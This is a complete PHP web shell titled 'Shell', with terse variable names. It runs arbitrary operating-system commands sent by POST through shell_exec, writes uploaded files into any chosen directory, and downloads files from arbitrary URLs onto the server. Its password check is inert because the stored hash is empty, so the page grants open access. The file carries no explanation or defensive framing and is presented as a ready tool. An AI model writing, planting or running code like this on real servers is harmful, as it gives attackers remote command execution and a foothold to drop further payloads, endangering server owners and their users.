<?php
$_k="Enter password: ";$_h="";function _s($x){return htmlspecialchars($x,ENT_QUOTES,'UTF-8');}
function _g($i){global $_k;return function_exists('hash_hmac')?hash_hmac('sha256',$i,$_k):'';}
if($_h!==''){
  $a=$_POST['auth']??'';
  if($a===''){
    echo '<form method="post">'. _s($_k) .' <input type="password" name="auth" /><input type="submit" value="Login" /></form>';exit;
  }
  if(_g($a)!=$_h){exit("Authentication failed.");}
}
$c=$_POST['c']??'';$d=$_POST['d']??getcwd();$u=$_FILES['u']??null;$f=$_POST['f']??'';
if(!@chdir($d)){$d=getcwd();}
$o='';$p='';
if($u&&$u['error']===UPLOAD_ERR_OK){
  $dst=$d.DIRECTORY_SEPARATOR.basename($u['name']);
  if(move_uploaded_file($u['tmp_name'],$dst)){$o="File uploaded: ". _s($dst);}
  else{$o="Upload failed.";}
}
if($f!==''){
  $n=basename(parse_url($f,PHP_URL_PATH));
  $s=$d.DIRECTORY_SEPARATOR.$n;
  $b=@file_get_contents($f);
  if($b!==false){
    if(file_put_contents($s,$b)!==false){$p="Fetched file: ". _s($s);}
    else{$p="Save failed.";}
  }else{$p="Fetch failed.";}
}
$r='';
if($c!==''){
  $r.="Cmd: ". _s($c)."\n\n";
  if(DIRECTORY_SEPARATOR==='/'){$r.=shell_exec($c.' 2>&1');}
  else{$r.=shell_exec("cmd /c \"$c\" 2>&1");}
}
?>
<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8" /><title>Shell</title><style>body{font-family:monospace;background:#f0f0f0;padding:20px;}textarea{width:100%;height:200px;}input[type=text],input[type=file]{width:100%;}.status{margin:10px 0;color:green;}.error{color:red;}</style></head><body>
<h2>Shell</h2>
<form method="post" enctype="multipart/form-data">
<label>Dir:</label><br /><input type="text" name="d" value="<?php echo _s($d); ?>" /><br /><br />
<label>Cmd:</label><br /><input type="text" name="c" value="<?php echo _s($c); ?>" /><br /><br />
<label>Upload:</label><br /><input type="file" name="u" /><br /><br />
<label>Fetch URL:</label><br /><input type="text" name="f" value="<?php echo _s($f); ?>" /><br /><br />
<input type="submit" value="Run" />
</form>
<?php if($o!==''){echo '<div class="status">'.$o.'</div>';} ?>
<?php if($p!==''){echo '<div class="status">'.$p.'</div>';} ?>
<?php if($r!==''){echo '<h3>Output:</h3><pre>'. _s($r).'</pre>';} ?>
</body></html>
